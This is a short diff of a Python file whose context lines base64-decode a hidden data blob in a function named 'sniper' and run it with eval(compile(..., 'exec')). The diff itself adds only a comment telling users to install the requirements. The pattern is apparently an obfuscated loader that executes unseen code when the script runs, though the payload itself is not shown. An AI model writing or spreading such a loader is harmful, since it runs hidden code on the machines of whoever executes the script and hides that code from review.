@@ -6,3 +6,5 @@ def sniper(b):
     return b64decode(b).decode('utf-8')
 
 eval(compile(sniper(data), '<string>', 'exec'))
+
+#install all modules by pip install -r requirements.txt
